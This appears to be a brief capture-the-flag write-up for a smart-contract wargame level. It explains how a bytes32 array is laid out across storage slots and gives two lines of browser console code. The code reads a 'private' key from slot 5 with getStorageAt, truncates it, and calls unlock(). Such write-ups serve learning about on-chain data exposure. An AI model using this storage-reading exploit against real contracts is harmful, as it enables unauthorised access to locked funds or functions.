### Analysis
Array data always start a new slot, so data starts from slot 3. Since it is bytes32 array each value takes 32 bytes. Hence value at index 0 is stored in slot 3, index 1 is stored in slot 4 and index 2 value goes into slot 5

### The Exploit
Run the code in Developer Tools:
~~~
key = (await web3.eth.getStorageAt(instance, 5)).slice(0, 32 + 2)
await contract.unlock(key)
~~~